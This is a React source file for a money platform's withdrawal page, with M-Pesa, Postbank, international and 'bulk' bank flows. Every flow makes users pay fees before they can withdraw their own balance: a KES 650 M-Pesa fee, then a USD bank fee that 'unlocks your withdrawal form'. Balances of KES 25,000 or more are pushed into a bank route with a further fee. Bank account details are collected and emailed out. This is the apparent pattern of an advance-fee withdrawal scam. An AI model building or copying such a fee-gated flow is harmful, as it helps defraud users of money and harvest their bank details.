            <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6' }}>
              A one-time bank withdrawal processing fee of <strong>${BANK_FEE_USD} USD</strong> applies, converted to KES at the <strong>live exchange rate</strong>.
            </div>
            <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>
              How many successful M-Pesa withdrawal fees have you paid before?
            </div>
            <div style={{ fontSize: 12.5, color: '#6b7280', marginBottom: 12 }}>
              Each previous <strong>KES 650</strong> M-Pesa fee is credited against this bank fee (maximum of two).
            </div>
            {quoteErr && <div style={{ color: '#4b5563', fontSize: 13, marginBottom: 12 }}>{quoteErr}</div>}
            {[
              [0, 'None — I have not paid before', 'No deduction'],
              [1, 'Once', 'Credit KES 650'],
              [2, 'Twice or more', 'Credit KES 1,300 (max)'],
            ].map(([n, label, sub]) => (
              <button key={n} className="pay-btn"
                style={{ background: n === 0 ? '#374151' : '#000000', marginBottom: 12, flexDirection: 'column', gap: 2, alignItems: 'center', height: 'auto', padding: '12px 16px' }}
                disabled={loadingQuote} onClick={() => loadIntlQuote(n)}>
                {loadingQuote && declaredFees === n
                  ? <><span className="spinner" /> Calculating…</>
                  : <><span style={{ fontWeight: 700 }}>{label}</span><span style={{ fontSize: 11.5, fontWeight: 500, opacity: 0.8 }}>{sub}</span></>}
              </button>
            ))}
            <button className="withdraw-close-btn" style={{ marginTop: 4 }} onClick={() => setGate('confirm')}><Icon name="arrowLeft" size={14} /> Back</button>
          </>
        )}
        {gate === 'fee' && quote && (
          <>
            <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6' }}>
              Bank withdrawal fee breakdown (live rate). Paying the amount below unlocks your withdrawal form.
            </div>
            <div style={{ background: '#fff', border: '1px solid #e5e7eb', borderRadius: 12, padding: '14px 16px', marginBottom: 16, fontSize: 13.5 }}>
              <div style={brRow}><span>Bank Withdrawal Fee</span><span>USD {quote.feeUsd}</span></div>
              <div style={brRow}><span>Converted Amount (rate {quote.rate}{quote.rateLive ? '' : '≈'})</span><span>KES {quote.convertedKes.toLocaleString()}</span></div>
              <div style={{ ...brRow, color: '#6b7280' }}><span>M-Pesa fees credited</span><span>{quote.eligibleDeductions} × KES {quote.perFeeKes.toLocaleString()}</span></div>
              {Array.from({ length: quote.eligibleDeductions }).map((_, i) => (
                <div key={i} style={{ ...brRow, color: '#374151' }}><span>Deduction {i + 1}</span><span>− KES {quote.perFeeKes.toLocaleString()}</span></div>
              ))}
              <div style={{ ...brRow, fontWeight: 800, borderTop: '1px solid #e5e7eb', marginTop: 6, paddingTop: 10 }}><span>Amount Due</span><span>KES {quote.amountDueKes.toLocaleString()}</span></div>
            </div>
            <MpesaPay
              purpose="withdrawal_fee"
              amount={quote.amountDueKes}
              defaultPhone={user?.phone || ''}
              payLabel={`Pay KES ${Number(quote.amountDueKes).toLocaleString()} via M-Pesa`}
              onSuccess={() => setGate('form')}
            />
            <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => { setQuote(null); setDeclaredFees(null); setQuoteErr(''); }}><Icon name="arrowLeft" size={14} /> Change M-Pesa fee count</button>
          </>
        )}
      </FlowShell>
    );
  }

  return (
    <FlowShell title="Withdraw from Other Countries" subtitle="Enter your bank account details" icon="globe" accent="#000000">
      <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6', marginBottom: 20 }}>
        {homeBanks.length ? (
          <>Based on your registration, we’re showing banks in <strong>{homeCountry}</strong>. Choose your bank and enter your account number in the format shown, or search for a different bank. Our payments team is notified automatically when you submit.</>
        ) : (
          <>Enter your name, choose your bank, and type your account number in the format shown. When you submit, our payments team is notified automatically and you’ll get a confirmation email.</>
        )}
      </div>

      <div className="pay-phone-label">Account Holder Name</div>
      <input className="pay-phone-input" type="text" value={accountName}
        onChange={e => { setAccountName(e.target.value); setErrors(p => ({ ...p, accountName: undefined })); }}
        placeholder="e.g. John Brown" style={{ borderColor: errors.accountName ? '#4b5563' : undefined }} />
      {errors.accountName && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.accountName}</div>}

      <div className="pay-phone-label" style={{ marginTop: 16 }}>Bank</div>
      <div style={{ position: 'relative' }}>
        <button type="button" className="pay-phone-input" onClick={() => setBankOpen(o => !o)}
          style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 8, width: '100%', textAlign: 'left', cursor: 'pointer', background: '#fff', borderColor: errors.bank ? '#4b5563' : undefined }}>
          {selectedBank ? (
            <span style={{ display: 'flex', alignItems: 'center', gap: 8, overflow: 'hidden' }}>
              <CodeBadge code={selectedBank.code} size={18} />
              <span style={{ fontWeight: 600, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{selectedBank.name}</span>
              <span style={{ color: '#9ca3af', fontSize: 12, whiteSpace: 'nowrap' }}>· {selectedBank.country}</span>
            </span>
          ) : (<span style={{ color: '#9ca3af' }}>Select your bank</span>)}
          <span style={{ color: '#9ca3af', display: 'flex', transform: bankOpen ? 'rotate(180deg)' : 'none' }}><Icon name="chevronDown" size={16} /></span>
        </button>
        {bankOpen && (
          <div style={{ position: 'absolute', top: 'calc(100% + 6px)', left: 0, right: 0, zIndex: 50, background: '#fff', border: '1px solid #e5e7eb', borderRadius: 12, boxShadow: '0 12px 32px rgba(0,0,0,0.18)', overflow: 'hidden' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '10px 12px', borderBottom: '1px solid #f1f5f9' }}>
              <span style={{ color: '#9ca3af', display: 'flex' }}><Icon name="search" size={16} /></span>
              <input autoFocus value={bankQuery} onChange={e => setBankQuery(e.target.value)} placeholder="Search banks worldwide…" style={{ flex: 1, border: 'none', outline: 'none', fontSize: 14, background: 'transparent' }} />
            </div>
            <div style={{ maxHeight: 240, overflowY: 'auto' }}>
              {filteredBanks.length === 0 && <div style={{ padding: 16, textAlign: 'center', color: '#9ca3af', fontSize: 13 }}>No banks found</div>}
              {filteredBanks.map(b => {
                const active = selectedBank && selectedBank.id === b.id;
                return (
                  <button key={b.id} type="button" onClick={() => selectBank(b)}
                    style={{ display: 'flex', alignItems: 'center', gap: 10, width: '100%', textAlign: 'left', padding: '10px 12px', border: 'none', cursor: 'pointer', background: active ? '#f3f4f6' : '#fff' }}>
                    <CodeBadge code={b.code} size={20} />
                    <span style={{ flex: 1, minWidth: 0 }}>
                      <span style={{ display: 'block', fontWeight: 600, fontSize: 14, color: '#111827', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{b.name}</span>
                      <span style={{ display: 'block', fontSize: 12, color: '#9ca3af' }}>{b.country}</span>
                    </span>
                    {active && <span style={{ color: '#111827', display: 'flex' }}><Icon name="check" size={16} /></span>}
                  </button>
                );
              })}
            </div>
          </div>
        )}
      </div>
      {errors.bank && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.bank}</div>}

      <div className="pay-phone-label" style={{ marginTop: 16 }}>Account Number</div>
      <input className="pay-phone-input" type="text" value={accountNumber}
        onChange={e => { setAccountNumber(e.target.value); setErrors(p => ({ ...p, accountNumber: undefined })); }}
        placeholder={selectedBank ? selectedBank.ph : 'Select a bank first'} disabled={!selectedBank}
        style={{ borderColor: accountNumber && !acctValid ? '#4b5563' : undefined, background: selectedBank ? '#fff' : '#f3f4f6', cursor: selectedBank ? 'text' : 'not-allowed' }} />
      {selectedBank && (
        <div style={{ fontSize: 12, marginTop: 4, color: accountNumber && !acctValid ? '#4b5563' : '#9ca3af' }}>
          {accountNumber && !acctValid ? `Doesn't match ${selectedBank.name}. It should look like: ${selectedBank.ph}` : `Format for ${selectedBank.name}: ${selectedBank.ph}`}
        </div>
      )}

      {formValid ? (
        <button className="pay-btn" style={{ background: '#000000', marginTop: 20 }} onClick={handleSubmit} disabled={sending}>
          {sending ? <><span className="spinner" /> Submitting…</> : <><Icon name="cash" size={16} /> Submit Withdrawal Request</>}
        </button>
      ) : (
        <div style={{ marginTop: 20, textAlign: 'center', fontSize: 13, color: '#9ca3af', padding: '12px', background: '#f9fafb', borderRadius: 10, border: '1px dashed #e5e7eb' }}>
          {!accountName.trim() ? 'Enter your name to continue' : !selectedBank ? 'Select your bank to continue' : 'Enter a valid account number to reveal Submit'}
        </div>
      )}
      <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Your account details are encrypted and secure</div>
    </FlowShell>
  );
}

// ── Bulk withdrawal flow (balances ≥ KES 25,000 → bank transfer only) ─────────
// Notice (previous M-Pesa fee?) → server-authoritative quote (live FX + capped
// deductions) → validated bank details → submit + pay the computed amount due.
function BulkWithdrawalFlow({ user, till }) {
  const router = useRouter();
  const [step,         setStep]         = useState('notice');   // notice | details | success
  const [declaredFees, setDeclaredFees] = useState(null);       // 0 | 1 | 2 (declared M-Pesa fees)
  const [quote,        setQuote]        = useState(null);
  const [loadingQuote, setLoadingQuote] = useState(false);
  const [submitting,   setSubmitting]   = useState(false);
  const [err,          setErr]          = useState('');
  const [errors,       setErrors]       = useState({});
  const [bank,         setBank]         = useState({
    bankName: '', accountName: user?.fullName || '', accountNumber: '', branch: '', swift: '',
  });

  const setField = (k, v) => { setBank(b => ({ ...b, [k]: v })); setErrors(e => ({ ...e, [k]: undefined })); };
  const bankValid = bank.bankName.trim() && bank.accountName.trim() && bank.accountNumber.trim();

  async function loadQuote(n) {
    setLoadingQuote(true); setErr('');
    const q = await bulkWithdrawalQuote(n);
    setLoadingQuote(false);
    if (!q?.success) { setErr(q?.error || 'Could not calculate the withdrawal fee. Please try again.'); return false; }
    setQuote(q);
    return true;
  }

  async function chooseCount(n) {
    setDeclaredFees(n);
    if (await loadQuote(n)) setStep('details');
  }

  async function submit() {
    const e = {};
    if (!bank.bankName.trim())      e.bankName      = 'Bank name is required';
    if (!bank.accountName.trim())   e.accountName   = 'Account name is required';
    if (!bank.accountNumber.trim()) e.accountNumber = 'Account number is required';
    setErrors(e);
    if (Object.keys(e).length) return;

    setSubmitting(true); setErr('');
    const res = await submitBulkWithdrawal({ ...bank, declaredFees });
    if (!res?.success) { setSubmitting(false); setErr(res?.error || 'Submission failed. Please try again.'); return; }

    // Email the authoritative request + bank details to the payments team.
    await sendNotify({
      type: 'Bulk Bank Withdrawal Request',
      name: bank.accountName.trim(), email: user?.email || '', phone: user?.phone || '',
      subject: 'Bulk Bank Withdrawal Request (≥ KES 25,000)',
      details:
        `Account Holder: ${bank.accountName.trim()}\nBank: ${bank.bankName.trim()}\nAccount Number: ${bank.accountNumber.trim()}\n` +
        `Branch: ${bank.branch.trim() || '—'}\nBank/SWIFT Code: ${bank.swift.trim() || '—'}\n\n` +
        `Balance: KES ${Number(res.balance).toLocaleString()}\n` +
        `Fee: USD ${res.feeUsd} @ ${res.rate} = KES ${res.convertedKes.toLocaleString()}\n` +
        `Deductions: ${res.eligibleDeductions} × KES ${res.perFeeKes} = KES ${res.deductionKes.toLocaleString()}\n` +
        `Amount Due: KES ${res.amountDueKes.toLocaleString()}\n\n` +
        `Requested by: ${user?.fullName || ''} (${user?.email || ''})`,
    });

    setSubmitting(false);
    setStep(res.amountDueKes > 0 ? 'pay' : 'success');
  }

  const rateNote = quote && !quote.rateLive ? ' (approx.)' : '';

  return (
    <FlowShell title="Bulk Withdrawal" subtitle="Bank transfer required" icon="cash">
      {step === 'notice' && (
        <>
          <div className="pay-message" style={{ borderColor: '#111827', background: '#f9fafb' }}>
            <div style={{ fontWeight: 800, marginBottom: 8, display: 'flex', alignItems: 'center', gap: 8 }}>
              <Icon name="warning" size={16} /> Bulk Withdrawal Notice
            </div>
            Your available balance of <strong>KES {Number(user.balance).toLocaleString()}</strong> exceeds{' '}
            <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong>, which qualifies as a bulk withdrawal.
            For security and compliance purposes, this amount can only be withdrawn through your registered
            <strong> bank account</strong>.
          </div>

          <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>
            How many successful M-Pesa withdrawal fees have you paid before?
          </div>
          <div style={{ fontSize: 12.5, color: '#6b7280', marginBottom: 12 }}>
            Each previous <strong>KES 650</strong> M-Pesa fee is credited against the bank fee (maximum of two).
          </div>
          {err && <div style={{ color: '#4b5563', fontSize: 13, marginBottom: 12 }}>{err}</div>}

          {[
            [0, 'None — I have not paid before', 'No deduction'],
            [1, 'Once', 'Credit KES 650'],
            [2, 'Twice or more', 'Credit KES 1,300 (max)'],
          ].map(([n, label, sub]) => (
            <button key={n} className="pay-btn"
              style={{ background: n === 0 ? '#374151' : '#000000', marginBottom: 12, flexDirection: 'column', gap: 2, alignItems: 'center', height: 'auto', padding: '12px 16px' }}
              disabled={loadingQuote} onClick={() => chooseCount(n)}>
              {loadingQuote && declaredFees === n
                ? <><span className="spinner" /> Calculating…</>
                : <>
                    <span style={{ fontWeight: 700 }}>{label}</span>
                    <span style={{ fontSize: 11.5, fontWeight: 500, opacity: 0.8 }}>{sub}</span>
                  </>}
            </button>
          ))}
        </>
      )}

      {step === 'details' && quote && (
        <>
          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6' }}>
            Bank withdrawal is mandatory for balances of <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong> or more.
            The processing fee below is converted from <strong>USD {quote.feeUsd}</strong> at the live exchange rate.
          </div>

          {/* Fee breakdown */}
          <div style={{ border: '1px solid var(--gray-light)', borderRadius: 12, padding: 16, marginBottom: 18 }}>
            <div style={brRow}><span>Bank Withdrawal Fee</span><span>USD {quote.feeUsd}</span></div>
            <div style={brRow}><span>Exchange Rate (live)</span><span>1 USD = KES {quote.rate}{rateNote}</span></div>
            <div style={brRow}><span>Converted Amount</span><strong>KES {quote.convertedKes.toLocaleString()}</strong></div>
            <div style={{ ...brRow, color: '#6b7280' }}><span>M-Pesa fees credited</span><span>{quote.eligibleDeductions} × KES {quote.perFeeKes.toLocaleString()}</span></div>
            {Array.from({ length: quote.eligibleDeductions }).map((_, i) => (
              <div key={i} style={{ ...brRow, color: '#374151' }}><span>Deduction {i + 1} (M-Pesa fee)</span><span>− KES {quote.perFeeKes.toLocaleString()}</span></div>
            ))}
            {quote.eligibleDeductions > 0 && (
              <div style={brRow}><span>Total Deduction</span><strong>− KES {quote.deductionKes.toLocaleString()}</strong></div>
            )}
            <div style={{ ...brRow, borderTop: '1px solid var(--gray-light)', marginTop: 8, paddingTop: 12, fontSize: 16 }}>
              <span style={{ fontWeight: 700 }}>Amount Due</span>
              <strong style={{ fontSize: 20 }}>KES {quote.amountDueKes.toLocaleString()}</strong>
            </div>
            <button onClick={() => loadQuote(declaredFees)} disabled={loadingQuote}
              style={{ marginTop: 12, background: 'none', border: 'none', color: '#374151', fontSize: 12.5, fontWeight: 700, cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: 6, padding: 0 }}>
              <Icon name="refresh" size={13} /> {loadingQuote ? 'Recalculating…' : 'Recalculate at current rate'}
            </button>
          </div>

          {/* Bank details */}
          <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', marginBottom: 10 }}>Your Bank Account</div>
          {[
            ['bankName',      'Bank Name',                 'e.g. Equity Bank',       true],
            ['accountName',   'Account Name',              'Full name on the account', true],
            ['accountNumber', 'Account Number',            'e.g. 0123456789',        true],
            ['branch',        'Branch (optional)',         'e.g. Nairobi CBD',       false],
            ['swift',         'Bank Code / SWIFT (if any)','e.g. EQBLKENA',          false],
          ].map(([key, label, ph, req]) => (
            <div key={key} style={{ marginBottom: 12 }}>
              <div className="pay-phone-label">{label}{req && <span style={{ color: '#374151' }}> *</span>}</div>
              <input className="pay-phone-input" value={bank[key]} placeholder={ph}
                onChange={e => setField(key, e.target.value)}
                style={{ marginBottom: 0, borderColor: errors[key] ? '#4b5563' : undefined }} />
              {errors[key] && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors[key]}</div>}
            </div>
          ))}

          {err && <div style={{ color: '#4b5563', fontSize: 13, margin: '4px 0 10px' }}>{err}</div>}

          {bankValid ? (
            <button className="pay-btn" style={{ background: '#000000', marginTop: 8 }} disabled={submitting} onClick={submit}>
              {submitting ? <><span className="spinner" /> Submitting…</> : <><Icon name="arrowRight" size={16} /> Submit & Continue to Payment</>}
            </button>
          ) : (
            <div style={{ marginTop: 8, textAlign: 'center', fontSize: 13, color: '#9ca3af', padding: 12, background: '#f9fafb', borderRadius: 10, border: '1px dashed #e5e7eb' }}>
              Complete Bank Name, Account Name and Account Number to continue
            </div>
          )}
          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => { setStep('notice'); setErr(''); }}>
            <Icon name="arrowLeft" size={14} /> Back
          </button>
          <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6, marginTop: 10 }}>
            <Icon name="lock" size={13} /> Verified server-side • fee recalculated at the live rate
          </div>
        </>
      )}

      {step === 'pay' && quote && (
        <>
          <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 16 }}>
            Your request is recorded. Pay the <strong>KES {quote.amountDueKes.toLocaleString()}</strong> bank withdrawal fee via M-Pesa Buy Goods, then notify support to finish processing.
          </div>
          <MpesaPay
            purpose="withdrawal_fee"
            amount={quote.amountDueKes}
            defaultPhone={user?.phone || ''}
            payLabel={`Pay KES ${Number(quote.amountDueKes).toLocaleString()} via M-Pesa`}
            onSuccess={() => setStep('success')}
          />
        </>
      )}

      {step === 'success' && (
        <div style={{ textAlign: 'center', padding: '10px 0' }}>
          <div style={{ marginBottom: 8, display: 'flex', justifyContent: 'center', color: '#111827' }}><Icon name="check" size={52} /></div>
          <div style={{ fontFamily: 'var(--font-display)', fontSize: 22, fontWeight: 800, color: '#1f2937', marginBottom: 6 }}>Request Received</div>
          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6', textAlign: 'left', marginTop: 12 }}>
            We&apos;ve recorded your bulk bank withdrawal request and emailed a copy to our payments team at{' '}
            <strong>{user?.email}</strong>. They will process the transfer to your bank account.
          </div>
          {err && <div style={{ color: '#4b5563', fontSize: 13, marginTop: 8 }}>{err}</div>}
          <button className="pay-btn" style={{ background: '#000000', marginTop: 18 }} onClick={() => router.push('/dashboard')}>Back to Dashboard</button>
        </div>
      )}
    </FlowShell>
  );
}
const brRow = { display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: 13.5, color: '#111827', padding: '5px 0' };

export default function WithdrawPage() {
  const router = useRouter();
  const { user, ready } = useUser();
  const method = router.query.method;
  const stepQ  = router.query.step;
  const [till, setTill] = useState('1545320');
  useEffect(() => { fetchTill().then(setTill); }, []);

  if (!ready || !user) {
    return <FlowSkeleton rows={3} />;
  }

  // Bulk balances (≥ KES 25,000) ALWAYS use the dedicated bank-transfer workflow,
  // regardless of which withdraw button was pressed (e.g. the dashboard's
  // "Withdraw with M-Pesa" links straight to ?method=mpesa). This is what makes
  // the "how many M-Pesa fees have you paid?" step reachable for bulk users.
  const isBulk = Number(user?.balance || 0) >= BULK_THRESHOLD_KES;
  if (isBulk) return <BulkWithdrawalFlow user={user} till={till} />;

  if (method === 'mpesa')         return <MpesaFlow user={user} till={till} initialStep={stepQ === 'form' ? 'form' : 'fee'} />;
  if (method === 'postbank')      return <PostbankFlow user={user} till={till} initialStep={stepQ === 'form' ? 'form' : 'choice'} />;
  if (method === 'international')  return <InternationalFlow user={user} till={till} initialStep={stepQ === 'form' ? 'form' : 'mpesa'} />;

  // Chooser
  const overLimit = Number(user?.balance || 0) >= BULK_THRESHOLD_KES;
  return (
    <FlowShell title="Withdraw" subtitle="Choose how you’d like to withdraw" icon="cash">
      {overLimit && (
        <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb', marginBottom: 14 }}>
          Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>. Bulk amounts above <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong> must be withdrawn <strong>through the bank</strong>, not M-Pesa.
        </div>
      )}
      <button className="pay-btn" style={{ background: overLimit ? '#9CA3AF' : 'var(--mpesa-green)', marginBottom: overLimit ? 6 : 14, opacity: overLimit ? 0.65 : 1, cursor: overLimit ? 'not-allowed' : 'pointer' }} disabled={overLimit} onClick={() => router.push('/withdraw?method=mpesa')}>
        <Icon name="smartphone" size={16} /> Withdraw with M-Pesa
      </button>
      {overLimit && <div style={{ fontSize: 12, color: '#4b5563', marginBottom: 14 }}>M-Pesa is unavailable for bulk balances, please use a bank option below.</div>}
      <button className="pay-btn" style={{ background: '#000000', marginBottom: 14 }} onClick={() => router.push('/withdraw?method=postbank')}>
        <Icon name="cash" size={16} /> Withdraw with Postbank Kenya
      </button>
      <button className="pay-btn" style={{ background: '#000000' }} onClick={() => router.push('/withdraw?method=international')}>
        <Icon name="globe" size={16} /> Withdraw from Other Countries
      </button>
    </FlowShell>
  );
}
